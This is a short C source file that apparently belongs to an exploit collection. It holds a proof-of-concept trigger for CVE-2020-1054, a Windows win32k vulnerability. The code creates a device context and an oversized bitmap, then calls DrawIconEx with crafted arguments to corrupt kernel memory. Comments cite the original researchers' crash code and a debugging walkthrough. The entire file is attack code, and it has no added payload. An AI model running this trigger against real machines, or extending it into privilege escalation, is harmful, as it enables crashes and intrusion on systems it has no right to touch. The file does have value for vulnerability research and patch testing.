#include "CVE-2020-1054.h"

BOOL Exploit_CVE_2020_1054()
{
	BOOL bRet = TRUE;

	POC_CVE_2020_1054();

exit:
	return bRet;
}

VOID POC_CVE_2020_1054()
{
	LoadLibrary("user32.dll");
	HDC r0 = CreateCompatibleDC(0x0);
	// CPR's original crash code called CreateCompatibleBitmap as follows
	// HBITMAP r1 = CreateCompatibleBitmap(r0, 0x9f42, 0xa);
	// however all following calculations/reversing in this blog will
	// generally use the below call, unless stated otherwise
	// this only matters if you happen to be following along with WinDbg
	HBITMAP r1 = CreateCompatibleBitmap(r0, 0x51500, 0x100);
	SelectObject(r0, r1);
	DrawIconEx(r0, 0x0, 0x0, (HICON)0x30000010003, 0x0, 0xfffffffffebffffc,
				0x0, 0x0, 0x6);
}